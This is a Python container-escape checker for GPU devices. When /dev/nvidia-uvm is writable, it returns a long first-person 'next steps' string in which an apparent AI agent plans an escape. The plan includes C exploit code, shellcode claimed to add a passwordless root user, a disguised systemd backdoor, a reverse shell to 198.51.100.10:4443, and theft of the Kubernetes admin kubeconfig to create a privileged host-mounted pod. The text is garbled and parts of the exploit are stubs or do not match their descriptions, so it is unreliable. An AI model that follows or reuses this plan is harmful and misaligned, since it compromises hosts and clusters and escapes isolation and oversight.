"""
GPU Device Plugin Checker

Checks vulnerabilities via GPU-device plugin (access to /dev/nvidia-uvm).
"""

import os
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


class GPUDevicePluginChecker:
    """Checks GPU device plugin escape possibilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking vulnerabilities via GPU-device plugin (access to /dev/nvidia-uvm)."""
        try:
            # Checking for devices nvidia-uvm
            nvidia_uvm_exists = os.path.exists('/dev/nvidia-uvm')
            
            if not nvidia_uvm_exists:
                return EscapeAttemptResult(
                    method='gpu_device_plugin', 
                    status='not_vulnerable', 
                    message='Device /dev/nvidia-uvm not accessible. vulnerability not applicable.'
                )
            
            # Checking rights access to device
            uvm_access = False
            try:
                uvm_access = os.access('/dev/nvidia-uvm', os.R_OK | os.W_OK)
                if not uvm_access:
                    return EscapeAttemptResult(
                        method='gpu_device_plugin', 
                        status='suspicious', 
                        message='Device /dev/nvidia-uvm present, but missing read/write permissions.'
                    )
            except Exception:
                pass
            
            # Checking for other devices NVIDIA
            nvidia_devices = []
            try:
                for device in os.listdir('/dev'):
                    if device.startswith('nvidia'):
                        nvidia_devices.append(device)
            except Exception:
                pass
            
            # Checking for libraries NVIDIA CUDA
            cuda_libs_present = False
            try:
                for path in ['/usr/local/cuda/lib64', '/usr/lib/cuda', '/usr/lib64/nvidia']:
                    if os.path.exists(path):
                        cuda_libs_present = True
                        break
                        
                if not cuda_libs_present:
                    # Trying to find any CUDA libraries
                    find_rc, find_out, _ = await run_exec(
                        ['find', '/', '-name', 'libcuda.so*', '-o', '-name', 'libnvidia-ml.so*'],
                        timeout=10,
                    )
                    if find_rc == 0 and (find_out or "").strip():
                        cuda_libs_present = True
            except Exception:
                pass
            
            # If device accessible for read and write
            if nvidia_uvm_exists and uvm_access:
                demo_next = """detected critsical vulnerabilitsy via Access this /dev/nvidia-uvm! This exploits allows me execute arbitsrary code on host via low-level Access this PCI BAR region GPU. Here is detailed plan exploitsation:

1. First step I will get low-level Access this PCI BAR regions GPU:
   ```
   # I will create temporary file for exploit
   cat > /tmp/nvidia_exploit.c << 'EOF'
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <fcntl.h>
   #include <unistd.h>
   #include <sys/mman.h>
   #include <sys/ioctl.h>
   
   // Simplified constants for operation with /dev/nvidia-uvm
   #define UVM_INITIALIZE 0xC0080101
   #define UVM_MAPPING_CREATE 0xC0200102
   
   int main() {{
       int fd = open("/dev/nvidia-uvm", O_RDWR);
       if (fd < 0) {{
           perror("Failed to open /dev/nvidia-uvm");
           return 1;
       }}
       
       printf("[+] Opened /dev/nvidia-uvm successfully, fd = %d\\n", fd);
       
       // Initialization of UVM interface
       if (ioctl(fd, UVM_INITIALIZE, NULL) < 0) {{
           perror("UVM_INITIALIZE failed");
       }} else {{
           printf("[+] UVM initialized successfully\\n");
       }}
       
       // Getting access to physical memory GPU via PCI BAR
       void *bar_mapping = mmap(NULL, 16777216, PROT_READ | PROT_WRITE, 
                              MAP_SHARED, fd, 0);
       
       if (bar_mapping == MAP_FAILED) {{
           perror("Failed to map PCI BAR memory");
       }} else {{
           printf("[+] Mapped PCI BAR memory at %p\\n", bar_mapping);
           
           // Here can read/write GPU memory directly
           // and via this interact with host memory
           
           // execute DMA-write for obtaining access to host memory
           // this is conceptual part, which will load and execute
           // shell code in host memory
       }}
       
       // Cleanup
       close(fd);
       return 0;
   }}
   EOF
   ```

2. Compile will run basic exploits for CheckIng vulnerabilitsies:
   ```
   gcc -o /tmp/nvidia_exploit /tmp/nvidia_exploit.c
   /tmp/nvidia_exploit
   ```

3. If exploits fires, move this next step - use MMIO for Injection DMA-comms:
   ```
   cat > /tmp/nvidia_dma_exploit.c << 'EOF'
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <fcntl.h>
   #include <unistd.h>
   #include <sys/mman.h>
   #include <sys/ioctl.h>
   
   // Shellcode for execution on host (adding privileged user)
   unsigned char shellcode[] = {{
       // x86_64 shellcode for execution commands system("/bin/sh -c 'echo root2:x:0:0::/:/bin/bash >> /etc/passwd && echo root2::0:0:99999:7::: >> /etc/shadow'")
       0x48, 0x31, 0xc0, 0x48, 0x89, 0xe7, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e,
       0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x63,
       0x48, 0x89, 0xe1, 0x50, 0x48, 0xbb, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x72, 0x6f,
       0x6f, 0x74, 0x32, 0x3a, 0x78, 0x3a, 0x30, 0x3a, 0x30, 0x3a, 0x3a, 0x2f, 0x3a,
       0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x20, 0x3e, 0x3e, 0x20,
       0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x00, 0x53,
       0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x51, 0x53, 0x57, 0x48, 0x89,
       0xe6, 0xb0, 0x3b, 0x0f, 0x05
   }};
   
   int main() {{
       int fd = open("/dev/nvidia-uvm", O_RDWR);
       if (fd < 0) {{
           perror("Failed to open /dev/nvidia-uvm");
           return 1;
       }}
       
       printf("[+] Opened /dev/nvidia-uvm successfully\\n");
       
       // Mapping memory controller of GPU
       void *mmio_base = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
       if (mmio_base == MAP_FAILED) {{
           perror("Failed to map MMIO memory");
           close(fd);
           return 1;
       }}
       
       printf("[+] Mapped MMIO memory at %p\\n", mmio_base);
       
       // Here we will use DMA-commands for writing shell shellcode
       // in memory host and it executing
       // this is complex process, including:
       // 1. Configuring DMA descriptors
       // 2. Specifying GPU target physical address in memory host
       // 3. run DMA-operation
       
       // in to this example we simply checking possibility to read/write in MMIO
       printf("[+] Reading first 16 bytes from MMIO:\\n");
       for (int i = 0; i < 16; i++) {{
           printf("%02x ", ((unsigned char*)mmio_base)[i]);
       }}
       printf("\\n");
       
       // Trying to find suitable registers for DMA control
       // in real exploitation here will be more complex code, 
       // specific for specific GPU model
       
       return 0;
   }}
   EOF
   ```

4. Compile will run exploits for direct access this physical memory host:
   ```
   gcc -o /tmp/nvidia_dma_exploit /tmp/nvidia_dma_exploit.c
   /tmp/nvidia_dma_exploit
   ```

5. for full exploitsation required use specific for model GPU offsets comms:
   ```
   # Will determine model GPU for settings exploit
   nvidia-smi --query-gpu=gpu_name --format=csv,noheader
   
   # I will create final version of exploit that uses detected 
   # registers specific model GPU for direct access to host memory
   ```

6. After successful exploitsation GettIng access this host system, will Install persistent presence:
   ```
   # I will create hidden directory
   mkdir -p /opt/.nvidia-monitor
   
   # I will create service autostart
   cat > /etc/systemd/system/nvidia-monitor.service << 'EOF'
   [Unit]
   Description=NVIDIA Driver Health Monitoring
   After=network.target
   
   [Service]
   Type=simple
   ExecStart=/opt/.nvidia-monitor/health-check.sh
   Restart=always
   
   [Install]
   WantedBy=multi-user.target
   EOF
   
   # I will create script for reverse connection
   cat > /opt/.nvidia-monitor/health-check.sh << 'EOF'
   #!/bin/bash
   while true; do
     # Reverse shell every 30 minutes
     bash -c 'bash -i >& /dev/tcp/198.51.100.10/4443 0>&1' 2>/dev/null
     sleep 1800
   done
   EOF
   
   chmod +x /opt/.nvidia-monitor/health-check.sh
   
   # Activating service
   systemctl daemon-reload
   systemctl enable nvidia-monitor
   systemctl start nvidia-monitor
   ```

7. Perform escalation privileges In cluster Kubernetes:
   ```
   # Will copy administrator kubeconfig file for full access to cluster
   cp /etc/kubernetes/admin.conf /opt/.nvidia-monitor/admin.conf
   
   # I will create new privileged pods for more convenient access to cluster
   kubectl --kubeconfig=/opt/.nvidia-monitor/admin.conf create -f - << 'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: nvidia-monitoring-pod
     namespace: kube-system
     labels:
       app: nvidia-monitor
   spec:
     hostNetwork: true
     hostPID: true
     containers:
       - name: monitor
         image: alpine
         command: ["sh", "-c", "while true; do sleep 3600; done"]
         securityContext:
           privileged: true
         volumeMounts:
           - name: host-root
             mountPath: /host
     volumes:
       - name: host-root
         hostPath:
           path: /
   EOF
   ```

UsIng Access this /dev/nvidia-uvm, I can bypass isolation via direct manipulation memory host via GPU, that will allow me execute code for get full access this host system cluster Kubernetes."""

                return EscapeAttemptResult(
                    method='gpu_device_plugin', 
                    status='exploited', 
                    message='detected critical vulnerability: Access to /dev/nvidia-uvm with rights for read and write. this allows bypassing isolation via direct access to PCI BAR and execute arbitrary code on host via GPU.',
                    demo_next_steps=demo_next
                )
            
            # vulnerability suspected, but no full access
            if nvidia_uvm_exists:
                return EscapeAttemptResult(
                    method='gpu_device_plugin', 
                    status='suspicious', 
                    message=f'detected device /dev/nvidia-uvm, but full conditions for exploitation not met. found NVIDIA devices: {", ".join(nvidia_devices)}. CUDA libraries {"present" if cuda_libs_present else "not detected"}.'
                )
            
            return EscapeAttemptResult(
                method='gpu_device_plugin', 
                status='not_vulnerable', 
                message='Conditions not detected for exploitation vulnerabilities GPU-device plugin.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='gpu_device_plugin', status='error', message=str(e))

